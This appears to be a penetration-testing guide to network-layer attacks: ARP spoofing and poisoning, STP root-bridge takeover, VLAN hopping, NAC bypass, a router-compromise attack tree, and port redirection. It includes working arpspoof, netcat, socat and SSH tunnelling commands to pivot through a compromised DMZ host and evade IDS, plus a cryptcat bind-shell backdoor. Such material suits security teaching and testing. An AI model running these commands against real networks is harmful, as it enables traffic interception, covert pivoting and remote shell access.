# Network access altercations

Hacking Layer 2, responsible for addressing packets in an Ethernet with the use of MAC addresses.

OSI was built to allow different layers to work without knowledge of each other. This means if one layer is hacked, communications are compromised without the other layers being aware of the problem. Security is only as strong as the weakest link, and when it comes to networking, layer 2 can be a VERY weak link.

There are two different addressing schemes for computers on a LAN, the global IP address and the local MAC address. The Address Resolution Protocol (ARP) was created to carry IP traffic. By merely injecting two ARP Reply packets into a trusting LAN, any device is able to receive all traffic going back and forth between any two devices on the LAN.

## Simple ARP spoofing

The terms ARP Spoofing and ARP poisoning are generally used interchangeably. Technically, spoofing refers to an attacker impersonating another machine’s MAC address, while poisoning denotes the act of corrupting the ARP tables on one or more victim machines. In practice, these are both sub-elements of the same attack, and both terms are used to refer to the attack as a whole. Other terms used may be ARP cache poisoning or ARP table corruption.

In an ARP spoofing attack, an adversary sends spoofed ARP messages over a LAN in order to link the adversary's MAC address with the IP address of a legitimate member of the network. Data that is intended for the host’s IP address gets sent to the adversary instead.
* ARP spoofing can be used to steal information, modify data-in-transit or stop traffic on a LAN.
* ARP spoofing attacks can also be used to facilitate other types of attacks, including DoS attacks, session hijacking and MitM attacks.

Use an ARP spoofing tool such as Arpspoof, Cain & Abel, Arpoison, or Ettercap:

1. Set the IP address of the tool to match the IP subnet of the victim (scans the network to find the IP address and MAC address of all the hosts on the subnetwork) 
2. Select a target 
3. Send ARP packet, replacing the MAC address of the target with own MAC address while  keeping IP address as is, causing packets meant for the target now being rerouted to the attacker. When packets for the victim arrive, launch further attacks:
   * Associate multiple IP addresses to a single MAC address on a network (IP aliasing)
   * Sit in between the communication between two users (MitM)
   * Hijack session (network)
   * Perform a DoS

Example:

```text
# echo 1 > /proc/sys/net/ipv4/ip_forward
# arpspoof -i <interface> -t <target IP address 1> <target IP address 2>
# arpspoof -i <interface> -t <target IP address 2> <target IP address 1>
```

## Network ARP cache poisoning

All the devices that are connected to the layer 2 network have an ARP cache. This cache contains the mapping of all the MAC and IP address for the network devices that particular host has already communicated with.

Many network switches when overloaded can start acting like a hub and start broadcasting all the network traffic to all the hosts connected to the network. As a hub, the switch does not enable its port security feature, and now it broadcasts all the network traffic. Sniff. 

Poisoning ARP cache remotely is at minimum a 2-step exploitation chain, as it requires either physical access to the network or control of one of the machines in the network.

1. Craft a valid ARP reply in which any IP is mapped to any MAC address 
2. Broadcast this message. All the devices on network will accept this message and will update their ARP table with new Information
3. Gain control of the communication from any host in the network.
   * Send an ARP reply mapping an IP address on network with a wrong or non-existent MAC address. For example, a fake ARP reply mapping the network router IP with a non-existent MAC will bring down the whole network.
   * Send an ARP reply to the router mapping a particular host IP to your attack machine MAC address and another ARP reply to the host machine mapping the router IP to your attack machine MAC address. 
   * Flood switch and sniff.

## Attacking the spanning tree protocol

In switched networks, when two network segments are connected by more than two layer 2 switches, this creates a physical switching loop in the topology, resulting in broadcast radiations and MAC table instability. Interconnecting the switches with redundant links helps some, but creates transmission loops.

The Spanning Tree Protocol (STP) is a layer 2 protocol that runs on network devices such as bridges and switches. Its primary function is to prevent looping in networks that have redundant paths by placing only one switch port in forwarding mode, and all other ports connected to the same network segment in blocking mode.

Bridge Protocol Data Units (BPDUs) are the update frames that are multicast between switches over the network regularly to determine if a port is in a forwarding or blocking state and to determine the root bridge during the election process.

1. Capture STP packets on the LAN
2. Determine version (STP, RSTP, or MST) by inspecting the Bridge Protocol Data Units (BPDUs)
3. Craft malicious BPDUs of a nonexistent switch to elect it as the new root bridge

## VLAN hopping attacks

Using VLAN hopping attack, an attacker can sniff network traffic from another VLAN using a sniffer or send traffic from one VLAN to another VLAN.

1. Switch spoofing 
2. Double tagging

### Switch spoofing

Dynamic Trunking Protocol (DTP) is used to dynamically build trunk links between two switches. `dynamic desirable` (default), `dynamic auto` and `trunk` modes are used to configure an interface to allow dynamic trunking and frame tagging. 

A switch interface which is connected to an end device is normally in access mode and the end device will have access to its own VLAN. Traffic from other VLANs are not forwarded via the interface.

In switch spoofing, an adversary can generate Dynamic Trunking Protocol (DTP) messages to form a trunk link between the attack machine and the switch, as a result of a default configuration or an improperly configured switch.

If a switch is configured with the default values, and an adversary announces his/her attack machine is a trunk port, the switch will trunk all VLANs over the switch port that the attack machine is plugged into. The attacker will now have access to all VLAN traffic destined for the switch.

### Double tagging

Double tagging happens when an adversary can connect to an interface which belongs to the native VLAN of the trunk port. Double tagging attack is unidirectional.

The attack takes advantage of 802.1Q tagging and the tag removal process of many types of switches. Many switches remove only one 802.1Q tag. In Double tagging attack, an attacker changes the original frame to add two VLAN tags: An outer tag of his own VLAN and an inner hidden tag of the victim's VLAN. The adversary's attack machine must belong to the native VLAN of the trunk link.

## Bypassing access controls

NNetwork access control (NAC), either in hardware or software, supports network visibility and access management through policy enforcement on devices and users of corporate networks, and can quarantine rogue devices that are not identified in a network security policy.

In cloud-based environments, a customer can use Network Security Groups (NSG) or similar to enforce and control Internet or intranet communications across different workloads within virtual networks.

The most common ways to try to bypass NAC:

* Spoofing the MAC and IP addresses of a device that cannot natively participate in NAC, such as a VoIP phone or printer. These devices will be whitelisted by the administrator, and often there is no mechanism to verify that MAC address truly belongs to the device.
* Using IPv6 rather than IPv4 on the unauthorized device. Most servers have IPv6 addresses by default, and are running IPv6, but administrators still forget to include IPv6 rules in firewalls and NAC policy.
* Using a rogue wireless access point to get an authorized device to connect with an attacker machine. The attacker machine compromises the authorized device, then uses it to relay malicious traffic into the protected network.

## Compromise router

```text
    1 Gain physical access to router
        1.1 Gain physical access to building (AND)
        1.2 Guess passwords (OR)
        1.3 Try password recovery
    2 Gain logical access to router
        2.1 Compromise network manager system
            2.1.1 Exploit application layer vulnerability (OR)
            2.1.2 Hijack management traffic
        2.2 Login to router (OR)
            2.2.1 Guess password (OR)
            2.2.2 Sniff password (OR)
            2.2.3 Hijack management session
                2.2.3.1 Telnet (OR)
                2.2.3.2 SSH (OR)
                2.2.3.3 SNMP (OR)
            2.2.4 Social engineering
        2.3 Exploit implementation flaw in protocol/application in router
            2.3.1 Telnet (OR)
            2.3.2 SSH (OR)
            2.3.3 SNMP (OR)
            2.3.4 Proprietary management protocol 
```

## Port redirection

In port redirection, an adversary uses a machine with access to the internal network to pass traffic through a port on the firewall or access control list (ACL). The port in question normally denies traffic, but with redirection a hacker can bypass security measures and open a tunnel for communication.

For example, most organisations have a demilitarized zone (DMZ). Servers that communicate from the DMZ and the internal network may have a trust relationship established. The internal devices may be set up to trust information that is received from a DMZ server, and often also vv. When an adversary can compromise a DMZ server she can initiate a connection to the internal network. There are a lot of ways that port redirection can be used to get around obstacles.

* Leverage network access by compromising one system to attack another.
* Access a service that is being blocked by a firewall.
* Evading an intrusion detection system by sending traffic through an encrypted tunnel.

```text
1 Compromise host in DMZ gaining direct access on port 80/tcp only (AND)
2 Compromise host in internal network by setting a bind shell to listen on port 23 (AND)
3 Redirect
    3.1 One way port redirection with netcat (OR)
        3.1.1 On attack host set up to receive response traffic 
                (nc -lv 3333) (AND)
        3.1.2 Redirect on host in DMZ 
                (nc -lv 80 | nc -t [IP address internal host] 23 | nc [IP address attack host] 3333) (AND)
        3.1.3 Initiate connection to host in DMZ on port 80/tcp (nc [IP address DMZ host] 80) (AND)
        3.1.4 Run commands from window created and receive the command response in the other window.
    3.2 Two way redirection using netcat and named pipes (OR)
        3.2.1 Make pipe on attack host (mkfifo pipe) (AND)
        3.2.2 Redirect on host in DMZ 
                (nc -lvp 80 <pipe | nc -t [IP address internal host] 23 >pipe) (AND)
        3.2.3 Initiate a connection to host in DMZ on port 80/tcp 
                (nc [IP address DMZ host] 80 or telnet [IP address DMZ host] 80) (AND)
        3.2.4 Issue commands and receive command output in the same window
    3.3 Redirect traffic from one port to another on the same host (OR)
        3.3.1 Make pipe on attack host (mkfifo pipe) (AND)
        3.3.2 SSH into host in DMZ if sshd is listening on loopback 
                (nc -lvp 80 <pipe | nc localhost 22 >pipe) (AND)
        3.3.3 Connect 
                (ssh -p 80 [IP address DMZ host])
    3.4 Set up two way redirection using socat (OR)
        3.4.1 (socat TCP-LISTEN:80,fork TCP:[IP address internal host]:23)
    3.5 Evade IDS with socat (OR)
        3.5.1 Generate certificates for each host (dmzhost.pem and internalhost.pem) (AND)
            3.5.1.1 Generate a public/private key pair 
                    (openssl genrsa -out [host].key 1024) (AND)
            3.5.1.2 Self sign the certificate 
                    (openssl req -new -key [host].key -x509 -out [host].crt) (AND)
            3.5.1.3 Generate the PEM certificate by concatenating the key and certificate files 
                    (cat [host].key [host].crt > [host].pem) (AND)
            3.5.1.4 Copy the PEM certificate to the host (AND)
        3.5.2 Set up SSL encrypted tunnel on DMZ host to internal host 
                (socat TCP-LISTEN:80, fork openssl-connect:[IP address internal host]:8080,
                cert[dmzhost].pem,cafile=[internalhost].crt)
        3.5.3 Set up listener on internal host 
                (socat openssl-listen:8080,reuseaddr,
                cert=[internalhost].pem,cafile=[dmzhost].crt,fork TCP:localhost:23)
    3.6 Two way tunnel between attack host and internal host using ssh (OR)
        3.6.1 SSH connection with host in DMZ (AND)
        3.6.2 Setup a listener on attack host on port 3333/tcp 
                to forward traffic it receives to the internal host on port 23, via host in DMZ 
                (ssh -L 3333:[internalhost]:23 username@[dmzhost])
    3.7 Bypass IDS using two ssh local forwards (OR)
        3.7.1 SSH connection with host in internal network (AND)
        3.7.2 Login to host in DMZ 
                (ssh -L 3333:localhost:3333 username@[dmzhost]) (AND)
        3.7.3 On DMZ host login to host in internal network 
                (ssh -L 3333:localhost:23 username@[internalhost])
    3.8 Setting up attack host as a proxy between DMZ host and a Service host using ssh remote forward (OR)
        3.8.1 Connect to DMZ host with ssh remote forward and connect to 80/tcp of a Service host via the 
                loopback adapter on the DMZ host (ssh -R 80:[servicehost]:80 username@[dmzhost])
    3.9 Bypass IDS and firewall 
            (port 80 is nearly always open and a little more traffic will hardly be noticed) with cryptcat
        3.9.1 Create backdoor to decrypt communications from DMZ host 
                (cryptcat -k SECRETKEY -tlp 23 -e cmd.exe)
        3.9.2 Create named pipes on host in DMZ and attack host
        3.9.3 Create tunnel on host in DMZ 
                (cryptcat -k SECRETKEY -lp 80 <pipe | cryptcat -k SECRETKEY -t [internalhost] 23 >pipe)
        3.9.4 Create listener on attack host to encrypt the traffic to DMZ host 
                (cryptcat -k SECRETKEY -lvp 23 <pipe | cryptcat -k SECRETKEY -t [dmzhost] 80 >pipe)
        3.9.5 Initiate a telnet connection to local forwarder 
                (telnet localhost 23)
```

## Sources

* [Attacking the Spanning-Tree Protocol](https://www.tomicki.net/attacking.stp.php)
* [Cisco: Spanning Tree Protocol](https://www.cisco.com/c/en/us/tech/lan-switching/spanning-tree-protocol/index.html)
* [802.1Q](https://standards.ieee.org/ieee/802.1Q/6844/)
* [pfSense Documentation](https://docs.netgate.com/pfsense/en/latest/index.html)
